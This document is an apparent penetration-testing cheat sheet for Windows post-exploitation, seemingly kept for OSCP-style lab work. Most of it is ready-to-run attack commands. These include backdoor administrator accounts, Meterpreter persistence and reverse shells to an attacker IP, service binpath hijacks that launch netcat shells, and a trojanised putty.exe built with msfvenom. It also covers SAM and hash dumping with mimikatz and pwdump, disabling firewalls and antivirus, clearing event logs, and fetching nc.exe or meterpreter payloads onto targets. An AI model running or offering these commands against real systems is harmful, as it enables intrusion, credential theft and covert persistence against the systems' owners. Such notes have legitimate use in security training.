
## Info-sheet


+ IP address: *target*
+ DNS-Domain name: *target-domain*
+ Host name: *host-name*
+ OS: *os*
+ Web Server (web server name): *web-server*
+ Web server modules: *web-modules*
+ Kernel: *os-type*
+ ftp version: *ftp-version*
+ telnet Version: *telnet-version*
+ SSH service version: *ssh-version*
+ SMTP version: *smtp-version*
+ tftp version:*tftp-version*
+ Workgroup: *workgroup*
+ Windows domain: *win-domain*
+ samba version : *samba-version*
+ database type: *database*
+ database version:*database-version*
+ mysql version: *mysql-version*
+ scripting languages:*scripting* 
+ possible users:*users*
+ possible passwords:*passwords*

```
INSERTTCPSCAN
```


#### list of privledge escalation tricks for windows versions

Open this website to get a list of which versions are vulnerable to what

https://pentestlab.blog/2017/04/24/windows-kernel-exploits/

#### Many of the exploits are located here

viper-shell/application/modules/post/privledge-escalation/windows


#### Windows privilege Escalation resources 

Google: All roads lead to system and download whitepaper

https://labs.mwrinfosecurity.com/publications/windows-services-all-roads-lead-to-system/

google: Windows Access tokens

https://labs.mwrinfosecurity.com/assets/142/original/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf

Google: Abusing token privileges for windows

Windows Privilege Escalation

http://www.fuzzysecurity.com/tutorials/16.html

https://www.youtube.com/watch?v=kMG8IsCohHA

https://www.youtube.com/watch?v=PC_iMqiuIRQ

https://github.com/GDSSecurity/Windows-Exploit-Suggester     

http://hackingandsecurity.blogspot.ca/2017/09/oscp-windows-priviledge-escalation.html

https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/

http://www.hackingarticles.in/7-ways-get-admin-access-remote-windows-pc-bypass-privilege-escalation/

## Quick Commands

#### Windows add user

net user hacker Passw0rd123! /add

net user joe Passw0rd123! /add

#### Create a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’

net localgroup administrators /add hacker

Or

net localgroup administrators hacker /add

net localgroup administrators joe /add

#### add user to remote desktop users

NET LOCALGROUP "Remote Desktop Users" hacker /ADD

#### delete users

net user hacker /delete


### rdesktop

rdesktop -u hacker -p Passw0rd123! 10.11.1.31

rdesktop -u hacker -p Passw0rd123! 10.11.1.49


#### allow RDP from command line

http://www.hacking-tutorial.com/tips-and-trick/how-to-enable-remote-desktop-using-command-prompt/

reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 

Reg add “\\bethany\HKLM\SYSTEM\CurentControlSet\Control\Terminal Server”  /v fDenyTSConnections /t REG_DWORD /d 0 /f

NET LOCALGROUP "Remote Desktop Users" domain\jscott /ADD This would add the domain 

user domian\jscott to the local group Remote Desktop Users. If you'd like to add a non-domain user, simply leave off the domain 

prefix:mak

#### new remote deskop firewall disable commands

https://support.microsoft.com/en-us/help/947709/how-to-use-the-netsh-advfirewall-firewall-context-instead-of-the-netsh-firewall-context-to-control-windows-firewall-behavior-in-windows-server-2008-and-in-windows-vista

diable network level authentication with powershell ** watch out for """ ticks in scripts here

https://www.petri.com/disable-remote-desktop-network-level-authentication-using-powershell


#### Metepreter to cmd on windows

execute -f cmd.exe -i -H

#### Persistance for windows

run persistence -U -i 5 -p 443 -r 10.11.0.202

run persistence -U -i 5 -p 666 -r 10.11.0.202

set  LPORT 443

exploit

persistance for linux

use exploit/linux/local/cron_persistence

set session 1

set payload cmd/unix/reverse_perl

set LHOST 10.11.0.202

set LPORT 444

run


#### download

meterpreter >  download c:\\boot.ini

#### upload

meterpreter > upload evil_trojan.exe c:\\windows\\system32

#### backdoor a file:

wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe


----------------------------------------------------------------------------
'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''
-----------------------------------------------------------------------------


## Privilege escalation

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

### Basic info

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords
- OS:
- Version:
- Architecture:
- Current user:
- Hotfixes:
- Antivirus:


### To-try list

Here you will add all possible leads. What to try.


### Windows exploit suggester

### beroot

https://github.com/AlessandroZ/BeRoot

#### whoami

Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.

```
whoami
```
```
whoami /groups

```


Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.

```
whoami /all
```



#### set 
set shows all current environmental variables. Specific ones to look for are 

USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.

```
set
```

#### drives info

Must be an administrator to run this, but it lists the current drives on the system.

fsutil fsinfo drives

reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"

#### Scheduled tasks



schtasks /query /fo LIST /v

Check this file:

c:\WINDOWS\SchedLgU.Txt

### check runas

```
runas administrator
```

#### AT command schedule an interactive command

Get the current time of the workstation

C:\> at 12:51 /interactive cmd

After the at command reconfirm your access privs

### schedule task to bypass UAC

https://pentestlab.blog/2017/05/03/uac-bypass-task-scheduler/

```
C:\>SchTasks /Create /SC DAILY /TN "NoUAC" /TR "C:\Users\User\Desktop\pentestlab3
.exe" /ST 23:36
```

### Scheduled tasks privescalation 

https://www.exploit-db.com/exploits/15589/

just upload to target and run it like a .exe the file is a windows scripting file. remember to change the username and password within the file. 

### unquoted service paths

https://blog.avecto.com/2015/11/path-of-enlightenment-part-1/

https://blog.avecto.com/2015/12/path-of-enlightenment-part-2-taking-tasks-to-task-2/

#### sam file 

C:\<systemroot>\sys32\config

C:\<systemroot>\repair

C:\> expand SAM uncompressedSAM

Recover the bootkey from SYSTEM using bkreg or bkhive


#### SAMDUMP2

#### chntpw

Tool used to reset windows 8 and below passwords




#### networking

Networking (ipconfig, netstat, net)

ipconfig /all

Displays the full information about your NIC’s.

ipconfig /displaydns

Displays your local DNS cache.

netstat -nabo

netstat -s -p [tcp|udp|icpm|ip]

netstat -r

netstat -na | findstr :445

netstat -nao | findstr LISTENING

XP and up for -o flag to get PIDnet acc

netstat -nao | findstr LISTENING

XP and up for -o flag to get PID

netstat -na | findstr LISTENING

netstat -bano | list ports and connections


### netsh diag show all

#### netsh show firewall state

netsh firewall show state

netsh firewall show config

#### netsh firewall enable disable commands

#### Disable the local windows firewall

netsh firewall set opmode disable

#### Enable the local windows firewall 

netsh firewall set opmode enable

#### net view

#### Querie NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup.

net view /domain

net view /domain:otherdomain

#### net user

#### Pull information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. 

net user %USERNAME% /domain

***Important things to note are login times, last time changed password, logon scripts, and group membership

#### List all of the domain users

net user /domain


#### Print the password policy for the local system. This can be different and superseded by the domain policy.

net accounts

#### print the password policy for the domain

net accounts /domain

#### prints the members of the Administrators local group

net localgroup administrators

#### another way to get *current* domain admins

net localgroup administrators /domain

#### print the members of the Domain Admins group

net group “Domain Admins” /domain

#### Prints the members of the Enterprise Admins group

net group “Enterprise Admins” /domain

print the list of Domain Controllers for the current domain

net group “Domain Controllers” /domain

### try to transfer files to the windows machine

some transfer methods will be at the end of the list

#### windows Exploit checker

viper-shell/application/modules/post/Win-exploit-suggester/

./windows-exploit-suggester.py --database 2017-06-02-mssb.xls --ostext 'Windows Vista (Build 6001, Service Pack 1)' 

#### windows Privilege checker

viper-shell/application/modules/post/windows-priv-check/

#### PsTools.exe

viper-shell/application/modules/post/privilege-escalation-wmic

#### WINENUM.bat

winenum.bat1

Winenum.bat2

viper-shell/application/modules/post/

#### winprivesc.bat

winprivesc.bat

viper-shell/application/modules/post/


#### net share

```
net share
```

nbtstat -a [ip here]

#### Display your currently shared SMB entries, and what path(s) they point to

net session | find / “\\”

#### List all the systems currently in the machine’s ARP table. 

arp -a

#### print the machine’s routing table. This can be good for finding other networks and static routes that have been put in place

route print

browstat (Not working on XP)

#### show all saved wireless profiles. You may then export the info for those profiles with the command below

netsh wlan show profiles

#### exports a user wifi profile with the password in plaintext to an xml file in the current working directory

netsh wlan export profile folder=. key=clear

#### start or stop a wireless backdoor on a windows 7 pc

netsh wlan [start|stop] hostednetwork

#### Complete hosted network setup for creating a wireless backdoor on win 7

netsh wlan set hostednetwork ssid=*ssid* key=*passphrase* keyUsage=persistent|temporary


#### enables or disables hosted network service

netsh wlan set hostednetwork mode=[allow|disallow]

#### wmic ntdomain listRetrieve information about Domain and Domain Controller

http://www.securityaegis.com/ntsd-backdoor/


#### Extremely verbose output of GPO (Group policy) settings as applied to the current system and user

gpresult /z

#### sc

sc qc

sc query

sc queryex

#### Print the contents of the Windows hosts file

type %WINDIR%\System32\drivers\etc\hosts

#### print a directory listing of the Program Files directory.

Start the command prompt from Run – cmd. Type cd and the directory path of the folder you want to list.

cd "Program Files"

dir > print.txt

Press Enter and exit from the DOS window.

Open the folder you wanted the listed file content for and you should see a print.txt file. This is a simple Notepad file that 

can be copied or printed easily.

#### find out where cmd.exe in the Windows directory

echo %COMSPEC%

#### Included script with Windows7, enumerates registry, firewall config, dns cache, etc.

c:\windows\system32\gathernetworkinfo.vbs                                         

#### Finding Important Files

#### Print a directory listing in ‘tree’ format. The /a makes the tree printed with ASCII characters instead of special ones and the

tree C:\ /f /a 

tree C:\ /f /a > C:\output_of_tree.txt

/f displays file names as well as folders

dir /a

dir /b /s [Directory or Filename]

#### Searche the output of dir from the root of the drive current drive (\) and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path.

dir \ /s /b | find /I “searchstring”

dir \ /s /b | find /I "cmd.exe"

#### Counts the lines of whatever you use for ‘command’

command | find /c /v “”

#### Files To Pull (if possible)

#### File location

#### Description / Reason

%SYSTEMDRIVE%\pagefile.sys

#### Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size

%WINDIR%\debug\NetSetup.log

%WINDIR%\repair\sam

%WINDIR%\repair\system

%WINDIR%\repair\software

%WINDIR%\repair\security

%WINDIR%\iis6.log (5, 6 or 7)

%WINDIR%\system32\logfiles\httperr\httperr1.log

#### IIS 6 error log

%SystemDrive%\inetpub\logs\LogFiles 

#### IIS 7’s logs location

%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log (year month day)

%WINDIR%\system32\config\AppEvent.Evt

%WINDIR%\system32\config\SecEvent.Evt

%WINDIR%\system32\config\default.sav

%WINDIR%\system32\config\security.sav

%WINDIR%\system32\config\software.sav

%WINDIR%\system32\config\system.sav

%WINDIR%\system32\CCM\logs\*.log

%USERPROFILE%\ntuser.dat

%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat

%WINDIR%\System32\drivers\etc\hosts

unattend.txt, unattend.xml, sysprep.inf

Used in the automated deployment of windows images and can contain user accounts. No known default location.

#### Remote System Access    

```
net share \\computername

tasklist /V /S computername

qwinsta /SERVER:computername

qprocess /SERVER:computername *

net use \\computername

```

This maps IPCdollar_sign which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed

```
net use \\computername /user:DOMAIN\username password
```

Using the IPCdollar_sign mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.

This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.

#### Enable remote desktop.

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#### Enable remote assistance

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

#### List tasks w/users running those tasks on a remote system. This will remove any IPCdollar_sign connection after it is done so if you are using another user, you need to re-initiate the IPCdollar_sign mount

net time \\computername (Shows the time of target computer)

dir \\computername\share_or_admin_share\   (dir list a remote directory)

tasklist /V /S computername

### Auto-Start Directories

ver (Returns kernel version - like uname on *nix)

#### Windows NT 6.1, 6.0

%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\

#### Windows NT 5.2, 5.1, 5,0

%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\

#### Windows 9x

%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\

#### Windows NT 4.0, 3.51, 3.50

%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\

#### Binary Planting

http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html

basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path you get code execution.%SystemRoot%\System32\wbem\mof\ 

Taken from stuxnet: http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf Look for Print spooler vulnCheck the dollar_signPATH environmental variableSome directories may be writable. 

See: https://www.htbridge.com/advisory/HTB23108

```

msiexec.exe

```
#### WMIC - Create BAT file and Run WMIC scripts

```
CODE
cd \
mkdir WMIC-PC-INFO
cd WMIC-PC-INFO
wmic qfe list full /format:htable > PATCHES.html
wmic qfe get hotfixid  list full /format:htable >  PATCH_IDS.html
wmic BIOS list full /format:htable > BIOS.html
wmic CSPRODUCT list full /format:htable > SM-BIOS.html
wmic CPU list full /format:htable > CPU-INFO.html
wmic COMPUTERSYSTEM list full /format:htable > COMPUTERSYSTEM.html
wmic BOOTCONFIG list full /format:htable > BOOTCONFIG.html
wmic BASEBOARD list full /format:htable > MOBO.html
wmic DISKDRIVE list /format:htable > DISK-DRIVES.html
wmic ENVIRONMENT list /format:htable > SYSTEM-ENV.html
wmic GROUP list /format:htable > GROUPS-SID.html
wmic USERACCOUNT list /format:htable > USERS-SID-STATUS.html
wmic SYSACCOUNT list full /format:htable > SYSACCOUNT-SECURITY-LIST.html
wmic SYSDRIVER list full /format:htable > SYSDRIVER-LIST.html
wmic STARTUP list full /format:htable > BASIC-STARTUP-LIST.html
wmic SHARE list full /format:htable > SHARES.html
wmic SERVICE list full /format:htable > SERVICES.html
wmic SERVER list full /format:htable > SERVER.html
wmic NIC list full /format:htable > NETWORK-ADAPTERS.html
wmic NICCONFIG list full /format:htable > NETWORK-ADAPTERS-DETAILED-INFO.html
wmic NETLOGIN list full /format:htable > NETLOGINS-INFO.html
wmic LOGICALDISK list full /format:htable > LOGICALDISK-INFO.html

```

#### WMI or WMIC

wmic bios

#### get patch IDs

wmic qfe qfe get hotfixid

wmic startupwmic service

wmic process get caption,executablepath,commandline

wmic process call create “process_name” (executes a program)

wmic process where name=”process_name” call terminate (terminates program)

wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)

wmic useraccount (usernames, sid, and various security related goodies)

wmic useraccount get /ALL

wmic share get /ALL (you can use ? for gets help ! )

wmic startup list full (this can be a huge list!!!)

wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)
Reg Command exit

#### reg

reg save HKLM\Security security.hive  (Save security hive to a file)

reg save HKLM\System system.hive (Save system hive to a file)

reg save HKLM\SAM sam.hive (Save sam to a file)

reg import [FileName ]

wevtutil el  (list logs)

wevtutil cl *LogName* (Clear specific lowbadming)

```
del %WINDIR%\*.log /a /s /q /f
```

#### Uninstalling Software “AntiVirus” (Non interactive)

wmic product get name /value (this gets software names)

wmic product where name="XXX" call uninstall /nointeractive (this uninstalls software)

#### Other  (to be sorted)

pkgmgr usefull  /iu :”Package”

pkgmgr usefull  /iu :”TelnetServer” (Install Telnet Service ...)

pkgmgr /iu:”TelnetClient” (Client )

rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)

#### wscript.exe *script js/vbs*

#### cscript.exe *script js/vbs/c#*

#### xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff

#### OS SPECIFICwmicWin2k3

winpop stat domainname


#### Vista/7

winstat features

wbadmin get status

wbadmin get items

gpresult /H gpols.htm

bcdedit /export *filename*

Vista SP1/7/2008/2008R2 (x86 & x64)

#### Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):

*Note* Works well after bypassuac + getsystem (requires system privileges)

*Note2* For Dism.exe to work on x64 systems, the long commands are necessary


#### To list features which can be enabled/disabled:

%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features

#### To enable a feature (TFTP client for example):

%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP

#### To disable a feature (again TFTP client):

%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP

#### Invasive or Altering Commands


These commands change things on the target and can lead to getting detected
Command
```
net user hacker Passw0rd123! /add

Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’

net localgroup administrators /add hacker

or

net localgroup administrators hacker /add

Adds the new user ‘hacker’ to the local administrators group
```

Share the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or 
modify anything on that drive.

```
net share nothingdollar_sign=C:\ /grant:hacker,FULL /unlimited
```


One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share 
permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is 
something to keep in mind

net user username /active:yes /domain

Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a 

red flag if those accounts are being watched.


#### Users:

#### Localgroups:


systeminfo

set

hostname

net users

net user user1

net localgroups

netsh firewall show state

netsh firewall show config


#### Blind Files, things to pull when all you can do is blindly read

Things to pull when all you can do is to blindly read) LFI/Directory traversal(s).Files that will have the same name across 

networks / Windows domains / systems.

File

Expected Contents / Description

%SYSTEMDRIVE%\boot.ini

A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.

%WINDIR%\win.ini

This is another file to look for if boot.ini isn’t there or coming back, which is some times the case.

%SYSTEMROOT%\repair\SAM

%SYSTEMROOT%\System32\config\RegBack\SAM

It stores users' passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \repair is locked, but can be retired 

using forensic or Volume Shadow copy methods

%SYSTEMROOT%\repair\system

%SYSTEMROOT%\System32\config\RegBack\system

#### Accesschk

http://www.fuzzysecurity.com/tutorials/16.html

http://averma82.blogspot.ca/2013/11/enable-remote-desktop-from-command-line.html


Steps

get the correct executable accesschk.exe make the executable chmod +x file

upload the file with whatever method you can, examples are davtest, ftp, tftp, 

```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```


#### start enumerating stuff with accesschk remember to /accepteula

These Windows services are started:

net start *service*

net stop *service*

#### look for read or writeable services by authenticated users

accesschk.exe -uwcqv "Authenticated Users" *  /accepteula

#### look for read or writeable files

accesschk.exe -uwqs users c:\*.* /accepteula

#### look at service permissions

accesschk.exe -ucqv Spooler /accepteula

accesschk.exe -ucqv SSDPSRV /accepteula

accesschk.exe -ucqv upnphost /accepteula

#### look for service properties to modify

https://toshellandback.com/2015/11/24/ms-priv-esc/

sc qc Spooler

sc qc SSDPSRV

sc qc upnphost

#### modify properties of services

sc config SSDPSRV binpath= "C:\Inetpub\Scripts\nc.exe -nv *ipaddress* 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config SSDPSRV binpath= "net user hacker Passw0rd123! /add"

sc config SSDPSRV start ="auto"

sc start SSDPSRV

sc config upnphost depend= ""

sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv *ipaddress* 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost binpath= "net user hacker P@ssw0rd123! /add"

sc config upnphost binpath= "net localgroup Administrators pwnage /add"

sc config upnphost obj= ".\LocalSystem" password= ""

sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv *ipaddress* 9988 -e C:\WINDOWS\System32\cmd.exe"

nc -lvp 9988

net start upnphost

#### start and stop services with sc

These Windows services are started:

net start *service*

net stop *service*


#### Accesschk upload example with davtest and netcat

```
./davtest.pl -URL http://*ipaddress*/Scripts -uploadfile /root/pwk_recon/mal_files/priv_esc/accesschk/accesschk.exe -uploadloc accesschk.exe.txt


nc 10.11.1.13 80 -vv
COPY /Scripts/accesschk.exe.txt HTTP/1.1
HOST: 10.11.1.13
Destination: http://*ipaddess*/scripts/accesschk.exe
Overwrite: T

```

#### pwdump.exe

pwdump.exe localhost

#### Churrasco.exe

Churrasco.exe "net user hacker Passw0rd123! /add

c:\Inetpub>Churrasco.exe "net user hacker Passw0rd123! /add"

Churrasco.exe "net user hacker Passw0rd123! /add"

The command completed successfully.

c:\Inetpub>Churrasco.exe "net localgroup administrators /add hacker"

Churrasco.exe "net localgroup administrators /add hacker"

The account already exists.

c:\Inetpub>Churrasco.exe "net localgroup administrators hacker /add"

Churrasco.exe "net localgroup administrators hacker /add

The command completed successfully.

c:\Inetpub>Churrasco.exe "net localgroup administrators /add hacker"

Churrasco.exe "net localgroup administrators hacker /add"



#### PsExec.exe

PsExec.exe /accepteula

Run commands on the local system

PsExec.exe \\\hostname -i -d -c -u *username* -p *password* file to run and accepteula

PsExec.exe \\hostname -i -d -c -u user -p password c:\Users\Public\nc.exe -nv 10.11.0.69 444 -e cmd.exe /accepteula

Run commands from a remote system

psexec /accepteula \\*ip* -u Domain\user -p *LM*:*NTLM* cmd.exe /c dir c:\Progra~1

Run remote command as system

psexec /accepteula \\*ip* -s cmd.exe

#### ICALCS

#### Week Services attacks

#### backdoor-legit-win-service.py

viper-shell/application/modules/post/

Examples are located here

viper-shell/application/modules/post/Scsi/


### Net Bious Null Sessions

C:\>net use \\192.168.3.2\IPCdollar_sign”” /u: “”’
this syntac connects to hidden inter process communication (IPCdollar_sign)
 
cmd.exe

C:\ Net Use \\*ipaddress*\ipcdollar_sign “” /u:””

#### Set path

set PATH=%PATH%;C:\xampp\php

### Kernel exploits


#### Look for hotfixes

systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

#### Search for exploits

site:exploit-db.com windows XX XX


### Cleartext passwords


#### Windows autologin

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#### VNC

reg query "HKCU\Software\ORL\WinVNC3\Password"

#### SNMP Parameters

reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#### Putty

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#### Search for password in registry

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s


#### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

#### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.


#### Meterpreter

run get_local_subnets

netstat /a

netstat -ano

##### METERPRETER FOR WINDOWS PRIV ESCALATION

ps

tasklist

run scraper

Use privs

Get system

Token impersonation

Use kiwi

Create windows persistence service

mimikatz

use post/windows/gather/win_privs 

set session 3

run

use post/windows/gather/enum_domain

set session 3

run

use post/windows/gather/enum_logged_on_users 

set session 3

run

use post/windows/gather/enum_applications 

set session 3

run

use exploit/windows/local/ms13_097_ie_registry_symlink 

info

use post/windows/local

use exploit/windows/local/ms13_053_schlamperei 

show options

set session 3

run

show options

set LHOST 10.11.0.202

set LPORT 2228

run

use post/windows/gather/credentials/credential_collector 

set session 3

run

sessions -i 3

execute -f cmd.exe -i -H

background

search bypassuac_vbs

use exploit/windows/local/bypassuac_vbs

show options

set session 3

run

show options

set LHOST 10.11.0.202

set LPORT 3331


exploit

search getsystem

use post/windows/escalate/getsystem

show options

set session 3

run

show technique

show -h

use exploit/windows/local/bypassuac_vbs

show options

show targets

exploit

exploit


sessions -i 3

sysinfo

hashdump

run hashdump

history

use exploit/windows/local/ms14_058_track_popup_menu 


#### Weak passwords

Remote desktop

ncrack -vv --user george -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS


### GET GUI s


#### Enable RDP

See section of terminal services in the red team field manual or check the methodologies tab in your PWK xls workbook. 

See wmic section in the red team field manual

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off

netsh firewall set opmode disable

Or like this

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?

Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

#### Enable windows 8 remote desktop

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" \f "DenyTSConnections" /t REG_DWORD /d 0x0 /f 

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\UserAuthentication = 0"

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\SecurityLayer = 0"

What out for the ticks in this article

https://www.petri.com/disable-remote-desktop-network-level-authentication-using-powershell



------------------------------------------------------------------------
----------------------------- LOOT LOOT LOOT LOOT -------------------
------------------------------------------------------------------------


## Loot

- Proof:
- Network secret:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Proof

### Network secret

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Covering your tracks

Windows

C:\del %WINDIR%\*.log /a/s/q/f

MSF>clearev

MSF>timestompc:\\ -r



### Upload /Download file - Transfer Tricks and reminders


Reminder to check out the red team field manual tips and tricks  “File Transfer”

#### Transferring methods and tools

debug.exe to transfer files

Upload files using scripting languages

o	USE VBScript

o	USE POWERSHELL

o	USE PYTHON

o	Use POWERSHELL

Using other programs to transfer files

o	USE WGET

o	USE FETCH

o	Using TFTP

o	USE FTP

#### FTP TRANSFERRING

ftp ftp.microsoft.com

use get or put

#### UPLOADING FILES WITH FTP

If you get access on the target and FTP is installed as a service then you might be able to setup FTP on the local attack 

station and get files to the target. 

apt-get update && apt-get install pure-ftpd

we first need to create a new user for PureFTPd.

groupadd ftpgroup

useradd -g ftpgroup -d /dev/null -s /etc ftpuser

pure-pw useradd offsec -u ftpuser -d /ftphome

pure-pw mkdb

cd /etc/pure-ftpd/auth/

ln -s ../conf/PureDB 60pdb

mkdir -p /ftphome

chown -R ftpuser:ftpgroup /ftphome/

/etc/init.d/pure-ftpd restart

We then run the script and provide a password for the offsec when prompted:

root@kali:~# chmod 755 setup-ftp

root@kali:~# ./setup-ftp

Password:

Enter it again:

Restarting ftp server

With our FTP server configured, we can now paste the following commands into a remote Windows shell and download files over FTP 

non-interactively.

From target machine run commands below

C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt

C:\Users\offsec>echo USER offsec>> ftp.txt

C:\Users\offsec>echo ftp>> ftp.txt

C:\Users\offsec>echo bin >> ftp.txt

C:\Users\offsec>echo GET nc.exe >> ftp.txt

C:\Users\offsec>echo bye >> ftp.txt

C:\Users\offsec>ftp -v -n -s:ftp.txt

#### UPLOADING FILES WITH TFTP

We first need to set up the TFTP server in Kali.

mkdir /tftp

1.	atftpd --daemon --port 69 /tftp

2.	cp /usr/share/windows-binaries/nc.exe /tftp/

3.	tftp -i 10.11.0.5 get nc.exe

another method we first need to set up the TFTP server in Kali.

1.	atftpd -daemon -bind-address 192.168.20.09 /tmp

2.	set the command parameter in shell.php script as follows

http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php c:\\xampp\\htdocs\\meterpreter.php

#### UPLOADING FILE USING VBSCRIPT

write out a VBS script that acts as a simple HTTP downloader

echo strUrl = WScript.Arguments.Item(0) > wget.vbs

echo StrFile = WScript.Arguments.Item(1) >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs

echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs

echo Err.Clear >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs

echo http.Open "GET", strURL, False >> wget.vbs

echo http.Send >> wget.vbs

echo varByteArray = http.ResponseBody >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs

echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs

echo strData = "" >> wget.vbs

